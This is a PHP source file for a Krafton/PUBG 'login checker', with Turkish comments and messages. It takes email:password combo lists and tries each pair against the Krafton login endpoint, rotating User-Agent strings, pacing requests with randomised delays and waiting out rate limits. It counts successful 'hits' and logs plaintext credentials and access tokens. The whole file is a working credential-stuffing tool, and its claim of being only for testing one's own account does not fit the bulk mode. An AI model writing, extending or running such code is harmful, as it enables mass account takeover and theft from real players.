<?php
/**
 * krafton.php — PUBG/Krafton login checker (tek + combo)
 * Sadece kendi hesabını test etmek için kullan.
 */
require_once __DIR__ . '/config.php';

$action = $_REQUEST['action'] ?? '';

$UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function krafton_headers($ua) {
    return [
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json',
        'User-Agent: ' . $ua,
        'Origin: https://accounts.krafton.com',
        'Referer: https://accounts.krafton.com/',
        'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8',
    ];
}

function krafton_login($email, $password, $ua) {
    $payload = json_encode([
        'email'            => $email,
        'password'         => $password,
        'trusted_device'   => false,
        'client_id'        => 'local',
        'activationVersion'=> 'v2',
    ], JSON_UNESCAPED_UNICODE);

    $ch = curl_init(KRAFTON_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => krafton_headers($ua),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING       => '',
    ]);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_error($ch);
    curl_close($ch);

    if ($err) return ['status' => 'error', 'message' => 'cURL: ' . $err];

    if ($code === 429) return ['status' => 'rate', 'message' => 'Rate limit'];
    if ($code === 404) return ['status' => 'endpoint', 'message' => 'Endpoint 404'];

    $json = json_decode($body, true);
    if (!is_array($json)) return ['status' => 'error', 'message' => 'Geçersiz JSON', 'raw' => substr($body, 0, 200)];

    if ($code === 200 && !empty($json['access_token'])) {
        return ['status' => 'hit', 'message' => 'Giriş başarılı', 'token' => $json['access_token']];
    }

    $errCode = $json['errorCode'] ?? null;
    if ($errCode === 2) return ['status' => 'bad', 'message' => 'Hatalı bilgiler'];
    if ($errCode === 1) return ['status' => 'bad', 'message' => 'Hatalı bilgiler'];

    return ['status' => 'fail', 'message' => $json['message'] ?? 'Bilinmeyen hata'];
}

function krafton_log_save($target, $email, $password, $result) {
    $logs = read_json(KRAFTON_LOG_FILE, []);
    $logs[] = [
        'id'       => gen_id(),
        'target'   => $target,
        'email'    => $email,
        'password' => $password,
        'success'  => $result['status'] === 'hit',
        'status'   => $result['status'],
        'message'  => $result['message'],
        'ts'       => time(),
    ];
    if (count($logs) > 2000) $logs = array_slice($logs, -2000);
    write_json(KRAFTON_LOG_FILE, $logs);
}

switch ($action) {

    case 'single':
        require_login();
        $email    = trim($_POST['email'] ?? '');
        $password = $_POST['password'] ?? '';
        if ($email === '' || $password === '') json_out(["success"=>false,"error"=>"email/şifre gerekli"]);

        $ua = $UA_LIST[array_rand($UA_LIST)];
        $res = krafton_login($email, $password, $ua);
        krafton_log_save('single', $email, $password, $res);

        if ($res['status'] === 'hit') {
            json_out([
                "success" => true,
                "status"  => "hit",
                "message" => "✔ Giriş başarılı",
                "token"   => substr($res['token'], 0, 60) . '...',
            ]);
        }
        json_out([
            "success" => false,
            "status"  => $res['status'],
            "error"   => $res['message'],
        ]);

    case 'combo':
        require_login();
        $content = $_POST['content'] ?? '';
        $delay   = max(1, min((int)($_POST['delay'] ?? 3), 30));
        $max     = max(1, min((int)($_POST['max'] ?? 50), 500));

        $lines = preg_split('/\r\n|\r|\n/', trim($content));
        $lines = array_values(array_filter($lines, fn($l) => strpos($l, ':') !== false));

        if (empty($lines)) json_out(["success"=>false,"error"=>"Geçerli combo satırı yok"]);
        if (count($lines) > $max) $lines = array_slice($lines, 0, $max);

        $sonuclar = [];
        $hit = 0;

        foreach ($lines as $line) {
            list($em, $pw) = array_map('trim', explode(':', $line, 2));
            if ($em === '' || $pw === '') continue;

            $ua = $UA_LIST[array_rand($UA_LIST)];
            $res = krafton_login($em, $pw, $ua);
            krafton_log_save('combo', $em, $pw, $res);

            if ($res['status'] === 'hit') $hit++;

            $sonuclar[] = [
                'email'   => $em,
                'status'  => $res['status'],
                'message' => $res['message'],
                'success' => $res['status'] === 'hit',
            ];

            if ($res['status'] === 'rate') sleep(30);
            else sleep($delay + rand(0, 2));
        }

        add_log('krafton_combo', 'denenen=' . count($sonuclar) . ' hit=' . $hit);
        json_out([
            "success"  => true,
            "denenen"  => count($sonuclar),
            "hit"      => $hit,
            "sonuclar" => $sonuclar,
        ]);

    case 'log':
        require_login();
        $logs = read_json(KRAFTON_LOG_FILE, []);
        $logs = array_slice(array_reverse($logs), 0, 200);
        json_out(["success" => true, "logs" => $logs]);

    case 'clear':
        require_login();
        write_json(KRAFTON_LOG_FILE, []);
        add_log('krafton_clear');
        json_out(["success" => true, "message" => "Krafton logu temizlendi"]);

    default:
        json_out(["success"=>false,"error"=>"Bilinmeyen action"], 404);
}